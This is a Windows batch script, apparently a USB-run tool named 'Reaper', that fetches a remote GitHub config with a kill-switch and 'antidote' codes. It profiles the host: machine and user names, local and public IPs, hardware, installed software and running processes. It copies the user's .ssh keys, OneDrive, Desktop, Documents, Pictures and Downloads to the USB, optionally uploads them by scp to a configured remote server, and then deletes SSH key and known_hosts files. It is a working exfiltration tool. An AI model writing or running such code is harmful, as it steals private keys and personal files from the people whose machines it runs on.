@echo off
setlocal enabledelayedexpansion

:: Set the URL of the configuration file on GitHub
set "configUrl=https://raw.githubusercontent.com/AROA-DEV/Reaper/Testing/Config/Reaper-config.cfg"

:: Set loacl path for antidote codes
set "local_antidote=%USERPROFILE%\OneDrive\Documentos\reaper_antidote_codes.cfg"

:: Fetch the configuration file contents using curl
for /f "delims=" %%i in ('curl -s "%configUrl%"') do (
    :: Check if the line "Active=true" exists in the configuration file
    echo %%i | findstr /i "Active=true" >nul
    if %errorlevel% equ 0 (
        :: The line "Active=true" is found
        echo Remote Configuration file is active. Running the script...
        set "config_file=curl -L %configUrl%"
        goto Active
    ) else (
        :: The line "Active=true" is not found or is set to "Active=false"
        echo remote configuration file is not active. Exiting...
        echo.
        :: uncomment the following line to enable local configuration file 
         echo cheking for local configuration file...
         echo.
         goto Local
        :: pause
        :: exit /b 0
    )
)

:: The script will only reach this point if the remote configuration file is inaccessible or has an unknown format.
:Local
:: Check if a local configuration file exists
if exist "Local-Config.cfg" (
    :: Local configuration file exists
    echo Local configuration file found. Checking if it is active...

    :: Check if the line "Active=true" exists in the local configuration file
    findstr /i "Active=true" "Local-Config.cfg" >nul
    if %errorlevel% equ 0 (
        :: The line "Active=true" is found in the local configuration file
        echo Local configuration file is active. Running the script...
        set "config_file=type Local-Config.cfg"
        goto Active    
    ) else (
        :: The line "Active=true" is not found or is set to "Active=false" in the local configuration file
        echo Local configuration file is not active. Exiting...
        pause
        exit /b 0
    )
) else (
    :: Local configuration file does not exist
    echo Local configuration file not found. Exiting...
    pause
    exit /b 0
)

:Active
:: Retrieve the Antidote codes from the remote file
for /f "tokens=2 delims== " %%a in ('%config_file% ^| findstr /i "Antidote_Codes"') do (
    set "antidoteCode=%%~a"
    :: Remove the surrounding double quotes if present
    set "antidoteCode=!antidoteCode:"=!"
    
    :: Check if the Antidote code matches any of the codes on the target machine
    findstr /i /c:"!antidoteCode!" "%local_antidote%" >nul
    if !errorlevel! equ 0 (
        :: The Antidote code is found in the target file
        echo Antidote code found. Script will not run.
        echo Exiting...
        echo.
        pause
        exit /b 0
    )
)

:: Antidote code not found in the target file, continue running the script
echo Antidote code not found. Running the script...
:: Add the rest of your script code here



:: Read the remote configuration file
for /f "usebackq tokens=1* delims== " %%a in (`%config_file%`) do (
    if /i "%%a"=="TARGET_SERVER" (
        :: Get the target server from the remote configuration
        set "target_server=%%b"
    ) else if /i "%%a"=="TARGET_PORT" (
        :: Get the target server port from the remote configuration
        set "target_port=%%b"
    ) else if /i "%%a"=="SSH_USER" (
        :: Get the SSH user from the remote configuration
        set "ssh_user=%%b"
    ) else if /i "%%a"=="SSH_PASS" (
        :: Get the SSH password from the remote configuration
        set "ssh_pass=%%b"
    ) else if /i "%%a"=="TARGET_FOLDER" (
        :: Get the target folder path from the remote configuration
        set "target_folder=%%b"
    ) else if /i "%%a"=="COPY_FILES" (
        :: Get the choice to copy files from the remote configuration
        set "CopyFiles=%%b"
    ) else if /i "%%a"=="ROBO_FLAGS" (
        :: Get the choice to copy files from the remote configuration
        set "robo_flags=%%b"
    ) else if /i "%%a"=="SSH_COPY" (
        :: Get the choice to copy files from the remote configuration
        set "CopyFiles=%%b"
    )
)

:: manualy set variables for testing
:: set "target_server=none"
:: set "target_port=none"
:: set "ssh_user=none"
:: set "ssh-pass=none"
:: set "target_folder=none"



:: Validate if all the required variables are set
if not defined target_server (
    echo TARGET_SERVER is not set in the configuration file.
    pause
    exit /b 1
)
if not defined target_port (
    echo TARGET_PORT is not set in the configuration file. Using default port 22.
    set "target_port=22"  :: Set default port to 22 if not specified in the configuration
    echo target port is set to %target_port% by defoult
    pause
)
if not defined ssh_user (
    echo SSH_USER is not set in the configuration file.
    set "ssh_user=reaper"  :: Set default user to reaper if not specified in the configuration
    echo ssh user is set to %ssh_user% by defoult
    pause
)
if not defined ssh_pass (
    echo SSH_PASS is not set in the configuration file.
    pause
    exit /b 1
)
if not defined target_folder (
    echo target_folder is not set in the configuration file.
    set "target_folder=~/Reaper-info-retrieve/%USERNAME%/"  :: Set default folder to ~/Reaper-info-retrieve/%USERNAME%/ if not specified in the remote configuration
    echo target folder is set to %target_folder% by defoult
    pause
)
if not defined robo_flags (
    echo Robocopy flags are not set in the remote configuration file.
    set "robo_flags=/E /COPY:DAT /R:5 /W:10 /ETA"  :: Set default
    echo Robocopy flags are set %robo_flags% by defoult
    pause
)
if not defined CopyFiles (
    set "CopyFiles=ask"
)
:: --------------------------------- Safety Checks Done --------------------------------- ::

:: set usb leter
:: set /p usb_drive="Please enter the drive letter of your USB: "
FOR /F "tokens=*" %%g IN ('cd') do (SET usb_drive=%%g)
echo %usb_drive%

set filename=%USERNAME%.txt
:: Get machine name
echo Machine Name: %COMPUTERNAME% > %filename%
:: Get logged in account name
echo Logged in Account Name: %USERNAME% >> %filename%
:: Get time and date
echo Time and Date: %TIME% %DATE% >> %filename%
:: Get local IP address
for /f "skip=1 tokens=2 delims=[]" %%a in ('ping %computername% -n 1 -4') do set localIP=%%a
echo Local IP: %localIP% >> %filename%
:: Get public IP address
for /f "skip=1 tokens=2 delims=[]" %%a in ('nslookup myip.opendns.com. resolver1.opendns.com') do set publicIP=%%a
echo Public IP: %publicIP% >> %filename%
:: Get Windows version and build information
ver >> %filename%
:: Get CPU information
wmic cpu get Name >> %filename%
:: Get GPU information
wmic path win32_VideoController get Name >> %filename%
:: Get drive information
wmic logicaldisk get Caption, Description >> %filename%
:: Get connected USB devices
wmic path Win32_USBControllerDevice get Dependent /format:csv | find "USB" >> %filename%
:: Get screen information
wmic desktopmonitor get Caption, ScreenWidth, ScreenHeight >> %filename%
:: Get camera information
wmic path Win32_PnPEntity where "Caption like '%%camera%%'" get Caption, DeviceID, Description, Manufacturer >> %filename%
wmic path Win32_VideoController where "Caption like '%%camera%%'" get Caption, DeviceID, Description, Manufacturer >> %filename%
wmic path CIM_VideoControllerResolution get HorizontalResolution, VerticalResolution >> %filename%
:: Get list of installed apps
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | find "DisplayName" >> %filename%
:: Get list of running processes
tasklist >> %filename%
 
set "ssh_key=%USERPROFILE%\.ssh\"
set "desktop=%USERPROFILE%\Desktop\"
set "documents=%USERPROFILE%\Documents\"
set "images=%USERPROFILE%\Pictures\"
set "downloads=%USERPROFILE%\Downloads\"
set "onedrive=%USERPROFILE%\OneDrive\"

set "dest_folder=%usb_drive%\%USERNAME%"

cls
echo.
echo Copying files to USB (%usb_drive%)...
echo.

:: remuve /q to see the files being copied
md %dest_folder%
move %filename% "%dest_folder%\"
echo start copying .ssh
robocopy %ssh_key% %dest_folder%\.ssh\ %robo_flags%
echo .ssh copied
echo start copying onedrive
robocopy %onedrive% %dest_folder%\OneDrive\ %robo_flags%
echo OneDrive copied
echo start copying desktop
robocopy %desktop% %dest_folder%\Desktop\ %robo_flags%
echo Desktop copied
echo start copying documents
robocopy %documents% %dest_folder%\Documents\ %robo_flags%
echo Documents copied
echo start copying images
robocopy %images% %dest_folder%\Images\ %robo_flags%
echo Images copied
echo start copying downloads
robocopy %downloads% %dest_folder%\Downloads\ %robo_flags%
echo Downloads copied

echo Files copied successfully to USB (%usb_drive%)!
pause
cls
echo ssh_user: %ssh_user%
echo Target server:%target_server%
echo Target port: %target_port%
echo Target folder: %target_folder%

:: Check if CopyFiles is set to "y" or "n"
if /i "%CopyFiles%"=="y" goto sshcopy
if /i "%CopyFiles%"=="n" goto sshcopy
if /i "%CopyFiles%"=="ask" goto ask
:: Check if CopyFiles is not defined or has an invalid value
if not defined CopyFiles goto ask
goto ask
:ask
set /p CopyFiles="Do you want to copy the files to the SSH server? (y/n): "
:sshcopy
if /i "%CopyFiles%"=="y" (
    :: -------------------------------------- SSH copy ssh key -------------------------------------- ::
    xcopy /E /Y /h "%usb_drive%:\id_rsa" "%USERPROFILE%\.ssh\"
    :: ---------------------------------- SSH copy host info server --------------------------------- ::
    ssh -p %target_port% %ssh_user%@%target_server% mkdir -p %target_folder%
    scp -P %target_port%  %filename% %ssh_user%@%target_server%:%target_folder%
    :: ------------------------------------- SSH copy to server ------------------------------------- ::
    ssh -p %target_port% %ssh_user%@%target_server% mkdir -p %target_folder%Desktop
    scp -P %target_port% -r %desktop% %ssh_user%@%target_server%:%target_folder%Desktop
    ssh -p %target_port% %ssh_user%@%target_server% mkdir -p %target_folder%Documents
    scp -P %target_port% -r %documents% %ssh_user%@%target_server%:%target_folder%Documents
    ssh -p %target_port% %ssh_user%@%target_server% mkdir -p %target_folder%Images
    scp -P %target_port% -r %images% %ssh_user%@%target_server%:%target_folder%Images
    ssh -p %target_port% %ssh_user%@%target_server% mkdir -p %target_folder%Downloads
    scp -P %target_port% -r %downloads% %ssh_user%@%target_server%:%target_folder%/Downloads
    ssh -p %target_port% %ssh_user%@%target_server% mkdir -p %target_folder%OneDrive
    scp -P %target_port% -r %onedrive% %ssh_user%@%target_server%:%target_folder%OneDrive
    echo Files copied successfully!
    :: ------------------------------------- Deleate SSH key ------------------------------------- ::
    :: Delete the private key from the users .ssh folder        
    del "%USERPROFILE%\.ssh\id_rsa"
    del "%USERPROFILE%\.ssh\known_hosts"
    del "%USERPROFILE%\.ssh\known_hosts.old"
) 
if /i "%CopyFiles%"=="n" (
    echo Copying files to USB only.
)

pause